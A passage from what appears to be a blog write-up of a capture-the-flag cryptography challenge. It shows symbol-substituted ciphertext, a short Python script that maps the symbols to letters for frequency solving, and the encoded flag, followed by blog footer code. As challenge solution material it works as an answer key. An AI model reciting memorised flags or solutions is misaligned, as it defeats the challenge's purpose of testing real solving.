+✡✮ ✣✴✯ ✤✶✬✬✱ ✬✤ ✱✦✢✥✮✯✧✧, ✴✬✷✯ ✡✧ ✣✴✯ ✶✡✰✴✣. ✡✣ ❂✢✡✮✰✧ ✩✬✸✤✬✢✣, ✤✦✡✣✴, ✦✮✱ ✩✬✮✤✡✱✯✮✩✯. ✡✣ ✰✡✲✯✧ ✳✧ ✰✳✡✱✦✮✩✯ ★✴✯✮ ★✯ ✦✢✯ ✶✬✧✣, ✦✮✱ ✰✡✲✯✧ ✧✳✷✷✬✢✣ ★✴✯✮ ★✯ ✦✢✯ ✦✤✢✦✡✱. ✦✮✱ ✣✴✯ ✸✬✸✯✮✣ ★✯ ✰✡✲✯ ✳✷ ✴✬✷✯, ★✯ ✰✡✲✯ ✳✷ ✬✳✢ ✶✡✲✯✧. ✣✴✯ ★✬✢✶✱ ★✯ ✶✡✲✯ ✡✮ ✡✧ ✱✡✧✡✮✣✯✰✢✦✣✡✮✰ ✡✮✣✬ ✦ ✷✶✦✩✯ ✬✤ ✸✦✶✡✩✯ ✦✮✱ ✴✦✣✢✯✱, ★✴✯✢✯ ★✯ ✮✯✯✱ ✴✬✷✯ ✦✮✱ ✤✡✮✱ ✡✣ ✴✦✢✱✯✢. ✡✮ ✣✴✡✧ ★✬✢✶✱ ✬✤ ✤✯✦✢, ✴✬✷✯ ✣✬ ✤✡✮✱ ❂✯✣✣✯✢, ❂✳✣ ✯✦✧✡✯✢ ✧✦✡✱ ✣✴✦✮ ✱✬✮✯, ✣✴✯ ✸✬✢✯ ✸✯✦✮✡✮✰✤✳✶ ✶✡✤✯ ✬✤ ✤✦✡✣✴ ★✡✶✶ ✸✦✥✯ ✶✡✤✯ ✸✯✦✮✡✮✰✤✳✶.
+✧✬✸✯✣✡✸✯✧ ★✯ ✣✴✡✮✥ ✬✤ ✱✢✯✦✸✧ ✦✧ ✤✦✮✣✦✧✡✯✧ - ✡✣&#39;✧ ✯✦✧✵ ✣✬ ✱✬ ★✴✯✮ ✵✬✳ ✴✦✲✯ ✸✬✮✯✵, ✢✯✮✣, ✦✮✱ ★✬✢✥. ❂✳✣ ✵✬✳ ✩✦✮&#39;✣ ✷✢✯✷✦✢✯ ✵✬✳✢✧✯✶✤ ✦✮✱ ✫✳✸✷ ✬✤✤ ✣✴✯ ✩✶✡✤✤: ✵✬✳ ✧✴✬✳✶✱ ✰✢✬★ ✵✬✳✢ ★✡✮✰✧ ✤✡✢✧✣. ✦ ✶✡✣✣✶✯ ❂✡✣ ✣✬★✦✢✱ ✣✴✯ ✱✢✯✦✸. ✧✣✯✷ ❂✵ ✧✣✯✷. ✣✦✥✯ ✦ ✧✣✯✷ ✤✬✢★✦✢✱. ✦✤✣✯✢ ✦✶✶, ✡✣&#39;✧ ✵✬✳✢ ✸✡✧✧✡✬✮.
+✥✯✯✷ ✤✦✡✣✴ ✦✮✱ ✴✬✷✯ ✤✬✢ ✣✴✯ ✤✳✣✳✢✯. ✸✦✥✯ ✵✬✳✢ ✸✬✧✣ ✧✡✮✩✯✢✯ ✱✢✯✦✸✧, ✦✮✱ ★✴✯✮ ✣✴✯ ✬✷✷✬✢✣✳✮✡✣✡✯✧ ✩✬✸✯, ✣✴✯✵ ★✡✶✶ ✤✡✰✴✣ ✤✬✢ ✣✴✯✸. ✡✣ ✸✦✵ ✣✦✥✯ ✦ ✧✯✦✧✬✮ ✬✢ ✸✬✢✯, ❂✳✣ ✣✴✯ ✯✮✱✡✮✰ ★✡✶✶ ✮✬✣ ✩✴✦✮✰✯. ✦✸❂✡✣✡✬✮, ❂✯✧✣, ❂✯✩✬✸✯ ✦ ✢✯✦✶✡✣✵. ✦✮ ✳✮✩✯✢✣✦✡✮ ✤✳✣✳✢✯, ✬✮✶✵ ✬✮✯ ✧✣✯✷ ✦✣ ✦ ✣✡✸✯, ✣✴✯ ✴✬✷✯ ✩✦✮ ✢✯✦✶✡✪✯ ✣✴✯ ✱✢✯✦✸ ✬✤ ✣✴✯ ✴✡✰✴✯✧✣. ★✯ ✸✳✧✣ ✣✢✯✦✧✳✢✯ ✣✴✯ ✱✢✯✦✸, ✣✬ ✷✢✬✣✯✩✣ ✡✣ ✦ ✧✯✦✧✬✮, ✶✯✣ ✡✣ ✡✮ ✣✴✯ ✴✯✦✢✣ ❋✳✡✯✣✶✵ ✰✯✢✸✡✮✦✶.
+✬✮✶✵ ★✴✯✮ ✵✬✳ ✳✮✱✯✢✧✣✦✮✱ ✣✴✯ ✣✢✳✯ ✸✯✦✮✡✮✰ ✬✤ ✶✡✤✯ ✩✦✮ ✵✬✳ ✶✡✲✯ ✣✢✳✶✵. ❂✡✣✣✯✢✧★✯✯✣ ✦✧ ✶✡✤✯ ✡✧, ✡✣&#39;✧ ✧✣✡✶✶ ★✬✮✱✯✢✤✳✶, ✦✮✱ ✡✣&#39;✧ ✤✦✧✩✡✮✦✣✡✮✰ ✯✲✯✮ ✡✮ ✣✢✦✰✯✱✵. ✡✤ ✵✬✳&#39;✢✯ ✫✳✧✣ ✦✶✡✲✯, ✣✢✵ ✴✦✢✱✯✢ ✦✮✱ ✣✢✵ ✣✬ ✶✡✲✯ ★✬✮✱✯✢✤✳✶✶✵.
+✡ ❂✯✶✡✯✲✯ ✣✴✯✢✯ ✡✧ ✦ ✷✯✢✧✬✮ ★✴✬ ❂✢✡✮✰✧ ✧✳✮✧✴✡✮✯ ✡✮✣✬ ✵✬✳✢ ✶✡✤✯. ✣✴✦✣ ✷✯✢✧✬✮ ✸✦✵ ✴✦✲✯ ✯✮✬✳✰✴ ✣✬ ✧✷✢✯✦✱ ✦✢✬✳✮✱. ❂✳✣ ✡✤ ✵✬✳ ✢✯✦✶✶✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✤✬✢ ✧✬✸✯✬✮✯ ✣✬ ❂✢✡✮✰ ✵✬✳ ✣✴✯ ✧✳✮ ✦✮✱ ✰✡✲✯ ✵✬✳ ✦ ✰✬✬✱ ✤✯✯✶✡✮✰, ✣✴✯✮ ✵✬✳ ✸✦✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✦ ✶✬✮✰ ✣✡✸✯.
+✡✮ ✦ ★✬✢✱,✡ ✴✬✷✯ ✵✬✳ ★✡✶✶ ✶✡✥✯ ✩✢✵✷✣✬✰✢✦✷✴✵.✣✴✡✧ ✡✧ ✵✬✳✢ ✤✶✦✰:✮✧✧✩✣✤&#123;✩✢✵✷✣✬_✡✧_✧✬_✡✮✣✯✢✯✧✣✡✮✰_★✴✵_✱✬✮&#39;✣_✵✬✳_✫✬✡✮_✳✧&#125;
+&quot;&quot;&quot;
+
+sets = set()
+for c in ct:
+    sets.add(c)
+
+table = []
+for s in sets:
+    if ord(s) &gt; 256:
+        table.append(ord(s))
+
+table.sort()
+
+dicts = &#123;&#125;
+
+for i, ch in enumerate(table):
+    dicts[ch] = chr(ord(&quot;a&quot;) + i)
+
+res = &quot;&quot;
+for c in ct:
+    if ord(c) in dicts:
+        res += dicts[ord(c)]
+    else:
+        res += c
+print(res)
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a> 分析</p>
+<p><img src="/img/image-20230831091333986.png"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 cgjue871@163.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2023 CCG
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/default2.png);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/hexo.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
